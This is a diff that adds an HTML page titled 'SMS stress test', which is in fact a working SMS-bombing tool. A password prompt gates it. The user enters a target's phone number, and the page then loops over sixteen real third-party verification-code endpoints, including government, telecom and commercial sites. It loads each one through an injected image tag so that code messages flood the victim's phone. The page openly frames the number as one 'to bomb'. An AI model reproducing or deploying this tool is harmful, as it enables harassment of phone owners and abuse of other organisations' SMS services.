@@ -1,0 +1,80 @@
+<html style="background: #202124;">
+
+<head>
+    <style>
+        @media screen and (prefers-color-scheme: light) {
+            html {
+                filter: invert(100%);
+            }
+        }
+        button {
+            position: relative;
+            transition-duration: 0.4s;
+            text-decoration: none;
+            overflow: hidden;
+            cursor: pointer;
+        }
+        button:after {
+            content: "";
+            background: #555;
+            display: block;
+            position: absolute;
+            padding-top: 300%;
+            padding-left: 350%;
+            margin-left: -20px !important;
+            margin-top: -120%;
+            opacity: 0;
+            transition: all 1s
+        }
+        button:active:after {
+            padding: 0;
+            margin: 0;
+            opacity: 1;
+            transition: 0s
+        }
+        input[type=text]:focus {
+            box-shadow: inset 0px -1px #666, 0px 1px #666;
+            transition: 0.5s;
+        }
+    </style>
+    <title>《短信测压》</title>
+    <script>
+        var person = prompt("请输入暗号～", "");
+
+        function fire() {
+            var name = document.getElementById("uid").value;
+
+
+
+            jiekou = ["https://gl.gdedu.gov.cn/api-service/captcha?phoneNumber={phone_number}&captchaType=QUERY_ADMIN", "http://id.lejiaolexue.com/api/sendvericode.ashx?phone={phone_number}", "http://api.welove520.com/v5/account/phone/verifyCode/send?phone_number={phone_number}&client_id=464847866_&type=6&area_code=86&app_key=ac5f34563a4344c4&sig=xvP64W04tR%2FNJoZEJEoJySmlIXU%3D", "https://uc.csdhe.com/v1/sms/send?mobile={phone_number}&apptype=examWeb", "https://elove.darryring.com/api/crm/newGwLogin/getSMSValidCode?phone={phone_number}&type=login", "https://mallapi.yofogo.com/biz-mall-application/v1/user/verifyCode/getVerifyCode?phone={phone_number}&descriptionType=1&codeType=2", "https://mall.yancais.com/api/sms/send?phone={phone_number}", "https://www.yojiang.cn/api/user/send_verify_code?phone={phone_number}", "http://jrh.financeun.com/Login/sendMessageCode3.html?mobile={phone_number}&mbid=197873&check=3", "https://www.phone580.com/fzsuserapi/user/sendsmscode?phonenum={phone_number}&modelid=16&templateid=42&key=&validCode=", "https://www.189.cn/dqmh/uamGetCheckCodeAction.do?method=getSMSDynamicCode&phoneNumber={phone_number}%20&ikl=1", "https://www.airparking.cn/h5app/sms/signup?mobile={phone_number}", "https://cloud.huace.cn/ChcnavCloudAuth/code/sms?mobile={phone_number}", "https://www.dehua.net/include/ajax.php?service=siteConfig&action=getphoneVerify&type=signup&phone={phone_number}&areaCode=86", "https://dss.xiaoyezi.com/student_app/auth/validate_code?mobile={phone_number}&country_code=86", "https://api.hetao101.com/login/v2/account/oauth/verifyCode?phoneNumber={phone_number}", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""];
+            if (person == "NmSl") {
+                for (var i = 0; i < jiekou.length; i++) {
+                    jiekoua = jiekou[i].replace(/{phone_number}/, name)
+                    document.getElementById("d1").innerHTML = "<img src='" + jiekoua + "'>";
+                }
+            }
+
+        }
+    </script>
+</head>
+
+<body>
+    <br />
+    <br />
+    <br />
+    <br />
+    <br />
+    <br />
+    <h1 style="text-align: center;color:#202124;text-shadow: 2px 2px 2px #bdc1c6;">——给他来点厉害的——</h1> 
+    <div style="margin-left: auto;margin-right: auto;width: 70%;">
+        <input id="uid" placeholder="需要轰炸的手机号" style="width: 100%;height: 30px;color: #999;background: #333;outline: none;border: none;" type="text" />
+    </div>
+    <div style="margin-left: auto;margin-right: auto;width: 100px;">
+        <button style="width: 100%;height: 30px;background: #333;color: grey;margin-top:30px;border: none;" onclick="fire()">Fire!</button>
+    </div>
+    <p style="text-align: center;color:#555;font-family: sans-serif;left: 0px;right: 0px; bottom: 0px;position: fixed">由Hirgen在WTFPL许可证下制作～</p>
+    <div id="d1"></div>
+
+</body>
+
+</html>
